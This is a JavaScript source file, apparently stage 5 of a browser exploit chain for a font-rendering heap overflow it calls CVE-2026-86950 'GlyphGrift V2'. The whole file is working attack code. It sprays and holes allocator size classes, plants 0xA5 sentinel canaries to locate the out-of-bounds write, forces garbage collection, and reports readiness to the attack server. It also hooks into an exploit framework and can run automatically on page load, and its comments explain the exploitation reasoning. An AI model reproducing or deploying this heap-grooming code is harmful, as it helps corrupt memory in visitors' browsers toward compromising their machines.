/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 5 heap spray.
 * Fills target bmalloc/libpas size classes with ArrayBuffers, frees every other slot
 * for holes, then POSTs /api/glyphgrift-heap-ready. Survivors stay on window for post-trigger.
 */
(function () {
  'use strict';

  var DEFAULT_ZONES = [48, 64, 80, 96, 128, 160, 192, 256];
  var PER_ZONE = 1024;
  var HOLE_INTERVAL = 2;
  var TARGET_SIZE = 128;
  var API = '/api/glyphgrift-heap-ready';

  /* Phase 4+8: sentinel canary. A DENSE (no-hole) spray of a unique 0xA5
     pattern, kept alive across the trigger. If the OOB 16-bit increment
     overflows past the undersized coverage buffer into a sentinel slot, the
     post-trigger scan flags the EXACT offset + before(0xA5)/after value.

     SIZING (the bug we were missing): the coverage buffer is
     4*(width_px+16) bytes, and the crafted glyph reaches ~1M device pixels wide,
     so on a HEAP OOB (DX>=32 -> malloc) the coverage allocation is in the
     KILOBYTE range (a large bmalloc size class), not the 48-256B small-object
     buckets. A canary only in the small buckets can never be physically
     adjacent to a KB-scale coverage buffer, so the increment would land in an
     allocation we do not observe. We therefore densely cover the small buckets
     AND the KB-scale large-object classes the coverage buffer is most likely to
     land in, so a neighboring canary catches the overflow regardless of the
     (bbox-broken) size. DX sweep 33-40 varies the broken width_px -> coverage
     size, so spanning the classes hedges the empirical outcome. */
  var SENTINEL_SIZES = [64, 96, 128, 160, 256, 512, 1024, 2048, 4096, 8192];
  var SENTINEL_PER = 256;
  var SENTINEL_BYTE = 0xa5;

  function fillPattern(buf, marker) {
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < u8.length; i++) {
      u8[i] = (marker + i) & 0xff;
    }
  }

  function forceGC() {
    try {
      for (var gc = 0; gc < 8; gc++) {
        var junk = [];
        for (var i = 0; i < 128; i++) junk.push(new ArrayBuffer(256 * 1024));
        junk = null;
      }
      for (var gc2 = 0; gc2 < 4; gc2++) {
        var big = new ArrayBuffer(4 * 1024 * 1024);
        big = null;
      }
    } catch (e) {}
  }

  function clearSprays() {
    window.__L0FCK_GLYPHGRIFT_SPRAYS = null;
    window.__L0FCK_GLYPHGRIFT_SPRAY = null;
    window.__L0FCK_GLYPHGRIFT_SENTINELS = null;
    forceGC();
  }

  function runSpray(targetZone, round) {
    var zones = (targetZone && typeof targetZone === 'number' && targetZone > 0)
      ? [targetZone]
      : DEFAULT_ZONES;
    var currentRound = typeof round === 'number' ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);

    var sprays = {};
    var totalSprayed = 0;
    var totalHoles = 0;

    for (var z = 0; z < zones.length; z++) {
      var size = zones[z];
      var allocSize = Math.max(16, size - 16);
      var arr = [];
      for (var i = 0; i < PER_ZONE; i++) {
        arr[i] = new ArrayBuffer(allocSize);
        fillPattern(arr[i], ((currentRound * 0x20) + (z * 0x10) + (i & 0x0f)) & 0xff);
        totalSprayed++;
      }

      for (var h = 0; h < arr.length; h += HOLE_INTERVAL) {
        arr[h] = null;
        totalHoles++;
      }
      sprays[size] = arr;
    }

    /* Phase 4: dense 0xA5 sentinel canary — no holes, unique pattern. */
    var sentinels = {};
    var totalSentinels = 0;
    for (var s = 0; s < SENTINEL_SIZES.length; s++) {
      var ss = SENTINEL_SIZES[s];
      var sarr = [];
      for (var si = 0; si < SENTINEL_PER; si++) {
        var sb = new ArrayBuffer(ss);
        var su8 = new Uint8Array(sb);
        for (var soff = 0; soff < su8.length; soff++) su8[soff] = SENTINEL_BYTE;
        sarr[si] = sb;
        totalSentinels++;
      }
      sentinels[ss] = sarr;
    }
    window.__L0FCK_GLYPHGRIFT_SENTINELS = sentinels;
    window.__L0FCK_GLYPHGRIFT_SENTINEL_BYTE = SENTINEL_BYTE;

    forceGC();

    window.__L0FCK_GLYPHGRIFT_SPRAYS = sprays;
    window.__L0FCK_GLYPHGRIFT_ZONES = zones;
    window.__L0FCK_GLYPHGRIFT_SPRAY = sprays[128] || sprays[zones[0]];
    window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE = zones[0];
    window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC = Math.max(16, zones[0] - 16);
    window.__L0FCK_GLYPHGRIFT_HOLE_COUNT = totalHoles;
    window.__L0FCK_GLYPHGRIFT_ROUND = currentRound;

    return {
      sprayed: totalSprayed,
      holes: totalHoles,
      target_zone: zones[0] || TARGET_SIZE,
      zones: zones,
      per_zone: PER_ZONE,
      round: currentRound,
      phase: 'holes_ready',
      heap_spray_ready: true
    };
  }

  function postReady(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx, zone, round) {
    var chosenZone = zone || window.__L0FCK_GLYPHGRIFT_ZONE || 0;
    var currentRound = (typeof round === 'number') ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);
    if (ctx && ctx.log) ctx.log('glyphgrift multi-zone spray round=' + currentRound);
    var payload = runSpray(chosenZone, currentRound);
    return postReady(payload).then(function () {
      if (ctx && ctx.report) {
        return ctx.report('glyphgrift_heap_spray', 'ok', JSON.stringify(payload));
      }
      return payload;
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_heap_spray = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_SPRAY = function (zone, round) {
    if (zone) window.__L0FCK_GLYPHGRIFT_ZONE = zone;
    if (typeof round === 'number') window.__L0FCK_GLYPHGRIFT_ROUND = round;
    return execute(null, zone, round);
  };
  window.__L0FCK_GLYPHGRIFT_FORCE_GC = forceGC;
  window.__L0FCK_GLYPHGRIFT_CLEAR_SPRAYS = clearSprays;

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_SPRAY === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();

